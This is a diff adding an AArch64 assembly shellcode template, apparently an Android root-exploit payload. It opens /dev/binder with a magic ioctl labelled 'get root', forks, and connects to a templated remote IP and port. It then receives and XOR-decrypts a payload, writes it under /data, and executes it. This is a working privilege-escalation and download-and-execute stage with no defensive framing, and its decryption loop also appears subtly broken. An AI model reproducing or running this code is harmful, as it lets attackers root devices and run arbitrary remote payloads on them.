@@ -1,0 +1,226 @@
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  nop;
+  sub sp, sp, 512;
+
+  // begin get root
+
+  mov  w0, 0x642f;
+  movk w0, 0x7665, lsl 16;
+  str w0, [sp, -8];
+
+  mov  w0, 0x622f;
+  movk w0, 0x6e69, lsl 16;
+
+  str w0, [sp, -4];
+
+  mov  w0, 0x6564;
+  movk w0, 0x0072, lsl 16;
+  str w0, [sp];
+
+  sub x1, sp, 8;
+  mov w2, 0;
+  mov w3, 0;
+  mov x8, 56;
+  svc 0;
+
+  // save binder fd
+  mov x11, x0;
+
+  mov  w1, 0xbeef;
+  movk w1, 0xdead, lsl 16;
+  mov w2, 0;
+  mov x8, 29;
+  svc 0;
+  mov x8, 174;
+  svc 0;
+
+  // end get root
+
+
+  // begin fork
+
+
+  mov  x0, 0;                     // #0
+  mov  x1, 0;                     // #0
+  mov  w2, 0x8011;                    // #17
+  movk w2, 0x120, lsl #16;
+  mov  x3, 0;                     // #0
+  mov  x4, 0;                     // #0
+  mov  x5, 0;
+  mov  x6, 0;
+  mov  x8, 220;
+  svc 0;
+
+  cmp x0, 0;
+  bne done;
+
+  // end fork
+
+  // begin socket
+
+  // AF_INET
+  mov x0, 2;
+  // SOCK_STREAM
+  mov x1, 1;
+  // protocol
+  mov x2, 0;
+  // __NR_SOCKET = 198
+  mov x8, 198;
+  // SYSCALL
+  svc 0;
+
+  //end socket 
+
+  // save socket fd in x9 for later
+  mov x9, x0;
+
+
+  //begin connect
+  // ip 127.0.0.1 port 54321 family AF_INET
+
+  mov  x1, 0x0002;
+  movk x1, 0x{PORT_LITTLE_ENDIAN:04x}, lsl 16;
+  movk x1, 0x{IP_BYTES_2_3:04x}, lsl 32;
+  movk x1, 0x{IP_BYTES_0_1:04x}, lsl 48;
+
+  str x1, [sp, -8];
+  str x2, [sp];
+
+  mov x8, 203;
+  sub x1, sp, 8;
+  mov x2, 16;
+  svc 0;
+
+  // end connect
+
+  // begin open
+  mov  x0, 0x642f;
+  movk x0, 0x7461, lsl 16;
+  movk x0, 0x2f61, lsl 32;
+  movk x0, 0x{TMP_FILE_BYTES_0_1:04x}, lsl 48;
+  str x0, [sp, -16];
+  mov x0, 0x{TMP_FILE_BYTES_2_3:04x};
+  str x0, [sp, -8];
+
+  mov x0, 0xff9c;
+  movk x0, 0xffff, lsl 16;
+  sub x1, sp, 16;
+  mov x2, 578;
+  mov x3, 511;
+  mov x8, 56;
+  svc 0;
+  // end open
+
+  // store fd in x10
+  mov x10, x0;
+
+  // begin recv
+
+  // load key into x6
+  mov  x6, 0x{XOR_KEY_BYTES_0_1:04x};
+  movk x6, 0x{XOR_KEY_BYTES_2_3:04x}, lsl 16;
+  movk x6, 0x{XOR_KEY_BYTES_4_5:04x}, lsl 32;
+  movk x6, 0x{XOR_KEY_BYTES_6_7:04x}, lsl 48;
+
+  mov x3, 0;
+recv_loop:
+
+  // socket fd
+  mov x0, x9;
+  // buffer
+  sub x1, sp, 512; 
+  // len
+  mov x2, 512;
+  // read syscall number
+  mov x8, 63;
+  svc 0;
+
+  cmp x0, 0x0;
+  beq exit;
+
+  // xor decrypt here
+  // index
+  mov x4, 0x0;
+  // buffer
+  sub x5, sp, 512;
+  mov x4, sp
+  xor_start:
+    // check if x4 >= len
+    cmp x5, x4
+    bge xor_end
+    // x7 = *x5
+    ldr x7, [x5]
+    // x7 = x7 ^ x6
+    eor x7, x6, x7
+    //*x5 = x7
+    str x7, [x5]
+    // x5 += 8
+    add x5, x5, 8
+    b xor_start
+  xor_end:
+
+  // len
+  mov x2, x0;
+  // file fd
+  mov x0, x10;
+  // write
+  mov x8, 64;
+  svc 0;
+  b recv_loop;
+
+  // end recv
+
+exit:
+  // close fds
+  mov x0, x11;
+  mov x8, 57;
+  svc 0;
+
+  mov x0, x10;
+  svc 0;
+
+  mov x0, x9;
+  svc 0;
+
+  mov  x0, 0x642f;
+  movk x0, 0x7461, lsl 16;
+  movk x0, 0x2f61, lsl 32;
+  movk x0, 0x{TMP_FILE_BYTES_0_1:04x}, lsl 48;
+  str x0, [sp, -16];
+  mov x0, 0x{TMP_FILE_BYTES_2_3:04x};
+  str x0, [sp, -8];
+
+  sub x0, sp, 16;
+
+  str x0, [sp, -32];
+  mov x1, 0;
+  str x1, [sp, -24];
+  sub x1, sp, 32;
+
+  mov x2, 0;
+  mov x8, 221;
+  svc 0;
+
+done:
+  add sp, sp, 512;
+  ret;
+
